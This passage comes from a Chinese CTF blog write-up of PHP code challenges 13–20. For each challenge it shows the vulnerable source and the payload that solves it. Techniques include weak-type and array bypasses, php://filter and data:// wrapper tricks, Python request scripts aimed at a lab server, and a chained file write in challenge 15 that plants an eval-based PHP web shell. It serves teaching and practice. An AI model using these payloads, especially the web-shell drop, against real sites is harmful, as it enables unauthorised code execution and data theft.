<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'./flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</span><br><span class="line">  $_SESSION[<span class="string">'time'</span>] = time();</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;				<span class="comment">#120秒后销毁会话</span></span><br><span class="line"></span><br><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];</span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);	<span class="comment">#创建a-z数组</span></span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];<span class="comment">#生成两个随机字母</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>]++;</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = $str_rands;</span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;		<span class="comment">//当whoami=value时，num+1，whoami=$str_rands；==弱类型比较</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>参数whoami要满足两个条件，一个是满足whoami输入的值与产生的随机值相等，另一个条件就是要满足md5($value)从第五位取，取四位，能够==0，其中后一个条件其实可以通过PHP的弱比较来进行利用，也就是说，只要保证第五位值为字母，就可以满足(md5($value),5,4) == 0<br>在120秒内传参十次就可以得到flag</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://148.70.62.239:23013/challenge13.php'</span></span><br><span class="line">a=requests.Session()</span><br><span class="line">b=a.get(url+<span class="string">'?value[]=ea'</span>).text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    b=a.get(url+<span class="string">'?value[]='</span>+ b[<span class="number">0</span>:<span class="number">2</span>]).text <span class="comment"># //这里的b[0:2]是获取读取的源代码的前两个字符,因为手工传一次`?value[]=ea`后可以发现，新的随机数在源码最前面  </span></span><br><span class="line">    print(b[<span class="number">0</span>:<span class="number">30</span>])</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1588990386149.png" alt="1588990386149"></p>
<p>也可以手动传参<br><img src="/2020/05/12/PHP_Code_Challenge/1588990523440.png" alt="1588990523440"></p>
<h1 id="challenge14"><a href="#challenge14" class="headerlink" title="challenge14"></a>challenge14</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'path'</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>($_REQUEST[<span class="string">'path'</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'phpinfo.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单的文件包含，并且allow_url_include为on，所以可以使用php伪协议</p>
<p>先使用php://input查看flag文件<br><img src="/2020/05/12/PHP_Code_Challenge/1588995335310.png" alt="1588995335310"></p>
<p>payload：</p>
<blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?path=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1588994986432.png" alt="1588994986432"></p>
<h1 id="challenge15"><a href="#challenge15" class="headerlink" title="challenge15"></a>challenge15</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET) &amp;&amp; !<span class="keyword">empty</span>($_GET))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $path = <span class="string">'upload/'</span>.$_GET[<span class="string">'path'</span>]; 	<span class="comment">#拼接路径</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(strpos($path,<span class="string">'..'</span>) &gt; <span class="number">-1</span>)&#123;	<span class="comment">#&amp;path不能包含..</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'SYCwaf!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(strpos($url,<span class="string">'http://127.0.0.1/'</span>) === <span class="number">0</span>)&#123;			<span class="comment">#url只能以http://127.0.0.1/开头</span></span><br><span class="line">    file_put_contents($path, file_get_contents($url));<span class="comment">#读取url中的内容，写入path中</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"console.log($path update successed!)"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hello.Geeker"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）</p>
<p>file_get_contents</p>
<p>将整个文件读入一个字符串</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">和 <span class="function"><span class="title">file</span>() 一样，只除了 <span class="title">file_get_contents</span>() 把文件读入一个字符串。将在参数 <span class="variable">offset</span> 所指定的位置开始读取长度为 <span class="variable">maxlen</span> 的内容。如果失败，<span class="title">file_get_contents</span>() 将返回 <span class="variable"><span class="literal">FALSE</span></span>。 </span></span><br><span class="line"><span class="function"><span class="title">file_get_contents</span>() 函数是用来将文件的内容读入到一个字符串中的首选方法。如果操作系统支持还会使用内存映射技术来增强性能。 </span></span><br><span class="line"><span class="function"><span class="variable">Note</span>: </span></span><br><span class="line"><span class="function">如果要打开有特殊字符的 <span class="variable">URL</span> （比如说有空格），就需要使用 <span class="title">urlencode</span>() 进行 <span class="variable">URL</span> 编码。 </span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<p>file_put_contents</p>
<p>将一个字符串写入文件<br><code>和依次调用 fopen()，fwrite() 以及 fclose() 功能一样。</code></p>
</blockquote>
<p>程序会访问url中的<code>file</code>，然后将返回内容写入到<code>$path</code>文件中，如果不存在返回空，再返回含<code>$path</code>的页面<br>首先构随便构造一个</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//148.70.62.239:23015/?path=aaa%3C?php%20phpinfo();?%3Ebbb&amp;file=http://127.0.0.1/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>成功将<a href="http://127.0.0.1中的内容写入aaa%3C?php%20phpinfo();?%3Ebbb文件中，并且发现PHP代码解析了" target="_blank" rel="noopener">http://127.0.0.1中的内容写入aaa%3C?php%20phpinfo();?%3Ebbb文件中，并且发现PHP代码解析了</a><br><img src="/2020/05/12/PHP_Code_Challenge/1589009096567.png" alt="1589009096567"></p>
<p>如果将该地址作为一个新的file，那么就会将把返回的<code>console.log(upload/aaabbb update successed!)</code>写入另一个文件中，即实现了写入一句话木马，由于php作为文件名的时候被解析了，所以要进行一次url编码，并且要将地址改为127.0.0.1</p>
<p>最终payload</p>
<blockquote>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">148.70</span>.<span class="number">62.239</span>:<span class="number">23015</span>/<span class="built_in">?path</span>=shell.php&amp;file=http://<span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>/?file=http://<span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>/<span class="built_in">&amp;path</span>=&lt;?php+@eval(<span class="variable">$_POST</span>[a]);?&gt;</span><br><span class="line">编码后</span><br><span class="line">http://<span class="number">148.70</span>.<span class="number">62.239</span>:<span class="number">23015</span>/<span class="built_in">?path</span>=shell.php&amp;file=http<span class="meta">%3a</span><span class="meta">%2f</span><span class="meta">%2f127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span><span class="meta">%2f</span><span class="meta">%3ffile</span><span class="meta">%3dhttp</span><span class="meta">%3a</span><span class="meta">%2f</span><span class="meta">%2f127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span><span class="meta">%2f</span><span class="meta">%26path</span><span class="meta">%3d</span><span class="meta">%3c</span><span class="meta">%3fphp</span><span class="meta">%2b</span><span class="meta">%40eval</span>(<span class="meta">%24_POST</span><span class="meta">%5ba</span><span class="meta">%5d</span>)<span class="meta">%3b</span><span class="meta">%3f</span><span class="meta">%3e</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>进行url编码的时候要将空格用+代替进行编码</p>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589010937407.png" alt="1589010937407"></p>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589010955624.png" alt="1589010955624"></p>
<h1 id="challenge16"><a href="#challenge16" class="headerlink" title="challenge16"></a>challenge16</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'hihi'</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (ereg(<span class="string">"^[a-zA-Z0-9]+$"</span>, $_POST[<span class="string">'hihi'</span>]) === <span class="keyword">FALSE</span>)	<span class="comment">#只能是数字和字母</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("have fun:)")&lt;/script&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (strlen($_POST[<span class="string">'hihi'</span>]) &lt; <span class="number">11</span> &amp;&amp; $_POST[<span class="string">'hihi'</span>] &gt; <span class="number">999999999</span>)<span class="comment">#可以通过科学计数法绕过</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (strpos($_POST[<span class="string">'hihi'</span>], <span class="string">'#HONG#'</span>) !== <span class="keyword">FALSE</span>)	<span class="comment">#hihi中存在#HONG</span></span><br><span class="line">          				<span class="comment">#数组绕过或者%00截断</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($_POST[<span class="string">'hihi'</span>])) &#123;	<span class="comment">#hihi不为数组</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Congratulations! FLAG is : "</span>.$flag;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("nonono")&lt;/script&gt;'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("nonono")&lt;/script&gt;'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("sorry")&lt;/script&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的</p>
</blockquote>
<p>payload:</p>
<blockquote>
<p>hihi=9e9%00#HONG#&amp;submit=1</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589012783822.png" alt="1589012783822"></p>
<h1 id="challenge17"><a href="#challenge17" class="headerlink" title="challenge17"></a>challenge17</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">header(<span class="string">"Content-type: text/html; charset=utf-8"</span>); </span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'flag.php'</span>); </span><br><span class="line">    $smile = <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> ($_GET[<span class="string">'^_^'</span>])) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'\.'</span>, $_GET[<span class="string">'^_^'</span>])) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'%'</span>, $_GET[<span class="string">'^_^'</span>])) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'[0-9]'</span>, $_GET[<span class="string">'^_^'</span>])) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'http'</span>, $_GET[<span class="string">'^_^'</span>]) ) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'https'</span>, $_GET[<span class="string">'^_^'</span>]) ) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'ftp'</span>, $_GET[<span class="string">'^_^'</span>])) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'telnet'</span>, $_GET[<span class="string">'^_^'</span>])) $smile = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">'_'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])) $smile = <span class="number">0</span>;  <span class="comment">#url ?后面不存在_</span></span><br><span class="line">    <span class="keyword">if</span> ($smile) &#123; </span><br><span class="line">        <span class="keyword">if</span> (@file_exists ($_GET[<span class="string">'^_^'</span>])) $smile = <span class="number">0</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> ($smile) &#123; </span><br><span class="line">        $smile = @file_get_contents ($_GET[<span class="string">'^_^'</span>]);  </span><br><span class="line">        <span class="keyword">if</span> ($smile === <span class="string">"(●'◡'●)"</span>) <span class="keyword">die</span>($flag);  </span><br><span class="line">    &#125;  </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>QUERY_STRING就是URL后接的参数</p>
<p>file_exists() 函数检查文件或目录是否存在。</p>
<p>如果指定的文件或目录存在则返回 true，否则返回 false</p>
</blockquote>
<p>搜索引擎会忽略下划线的存在<br>当<code>.</code>或<code>[]</code>之类的符号作为参数的key的时候，会被PHP改写为<code>_</code>，所以传入^.^便能绕过。<code>file_get_contents</code>可以获取远程数据，但常用网络协议已经被过滤，因此需要选取其他协议。查阅PHP支持的协议和包装，发现RFC 2397的data协议可用。巧合的是，<code>file_exists</code>对于data指向内容判断为不存在<br>payload：</p>
<blockquote>
<p>?^.^=data://text/plain;charset=unicode,(●’◡’●)</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589014602979.png" alt="1589014602979"></p>
<h1 id="challenge18"><a href="#challenge18" class="headerlink" title="challenge18"></a>challenge18</h1><p>在challenge18.php~中发现源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-type: text/html; charset=utf-8"</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'user'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(@strcmp($_POST[<span class="string">'user'</span>],$USER))<span class="comment">//USER是被隐藏的复杂用户名</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'user错误！'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($_POST[<span class="string">'name'</span>] == $_POST[<span class="string">'password'</span>] )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'账号密码不能一致！'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (md5($_POST[<span class="string">'name'</span>]) === md5($_POST[<span class="string">'password'</span>]))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(is_numeric($_POST[<span class="string">'id'</span>])&amp;&amp;$_POST[<span class="string">'id'</span>]!==<span class="string">'72'</span> &amp;&amp; !preg_match(<span class="string">'/\s/'</span>, $_POST[<span class="string">'id'</span>]))</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">if</span>($_POST[<span class="string">'id'</span>]==<span class="number">72</span>)</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">"flag&#123;xxxxxxxxxxxxx&#125;"</span>);</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">"ID错误2！"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">"ID错误1！"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'账号密码错误！'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">strcmp	比较两个字符串（区分大小写）：</span><br><span class="line">本函数返回：</span><br><span class="line"></span><br><span class="line"> <span class="number">0</span> - 如果两个字符串相等</span><br><span class="line"> &lt;<span class="number">0</span> - 如果 <span class="built_in">string</span>1 小于 <span class="built_in">string</span>2</span><br><span class="line"> &gt;<span class="number">0</span> - 如果 <span class="built_in">string</span>1 大于 <span class="built_in">string</span>2</span><br><span class="line">在PHP5<span class="number">.3</span>版本之后使用这个函数比较<span class="built_in">array</span>跟sring会返回<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>所以strcmp函数可以使用数组绕过，接着是md5===判断，也可以使用数组绕过<br>最后一点id，不能为数字72，又不能等于字符串<code>’72’</code>，不包含空白符，这里也是弱类型，floor类型<code>72.00</code><br>payload:</p>
<blockquote>
<p>user[]=a&amp;name[]=1&amp;password[]=12&amp;id=72.0&amp;login=Check</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589017428569.png" alt="1589017428569"></p>
<h1 id="challenge19"><a href="#challenge19" class="headerlink" title="challenge19"></a>challenge19</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'sss'</span>]))&#123;</span><br><span class="line">    show_source(<span class="string">'challenge19.php'</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$sss=$_GET[<span class="string">'sss'</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen($sss)==<span class="number">666</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/[^0-6]/"</span>,$sss))&#123;	<span class="comment">#只能包含 0--6 的数字</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'$sss='</span>.$sss.<span class="string">';'</span>);</span><br><span class="line">        <span class="keyword">if</span>($sss!==<span class="string">'0x666'</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>($sss==<span class="string">'0x666'</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过分析可知我们需要创建一个长度为 666 ,只包含0 – 6的数字，数值上等于 0x666且不等于字符串 ‘0x666’的参数，所以我们用八进制就可以了，创建 $sss = ‘00…03146’即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://148.70.62.239:23019/challenge19.php?sss='</span>+<span class="string">'0'</span>*<span class="number">662</span>+<span class="string">'3146'</span></span><br><span class="line">html = requests.get(url)</span><br><span class="line">print(html.content)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589037176956.png" alt="1589037176956"></p>
<h1 id="challenge20"><a href="#challenge20" class="headerlink" title="challenge20"></a>challenge20</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'user'</span>])) <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line"></span><br><span class="line">$user = [<span class="string">'admin'</span>, <span class="string">'xxoo'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'user'</span>] === $user &amp;&amp; $_GET[<span class="string">'user'</span>][<span class="number">0</span>] != <span class="string">'admin'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>$_GET[‘user’]</code> 是一个全局的变量，我们传的是字符串，它就是字符串，传的是数组，那么它的值就是数组</li>
<li><code>$user</code> 是一个数组, <code>[0 =&gt; ‘admin’, 1 =&gt; ‘xxoo’]</code></li>
<li><code>===</code> 三个等号的意思就是类型是同一类型，并且值也是相同的</li>
<li><code>$_GET[‘user’][0]</code> 的值不能等于 <code>‘admin’</code></li>
</ul>
<p>若要使这个 if 条件成立，就必须让两个键值不相等的数组经过 <code>===</code> 比较后返回 true</p>
<p>测试下面几个例子</p>
